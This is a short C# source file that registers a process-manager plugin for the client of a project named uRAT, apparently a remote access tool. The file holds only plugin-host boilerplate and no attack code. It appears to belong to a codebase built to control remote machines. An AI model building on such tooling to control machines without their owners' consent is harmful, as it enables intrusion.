using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;

using uRAT.Client.Plugin.Client;
using uRAT.ManagersClientPlugin.ProcessManager;

namespace uRAT.ManagersClientPlugin
{
    public class ManagersPluginHost : IClientPluginHost
    {
        public List<IClientPlugin> Plugins
        {
            get
            {
                return new List<IClientPlugin>
                {
                    new ProcessManagerPlugin()
                };
            }
        }
    }
}
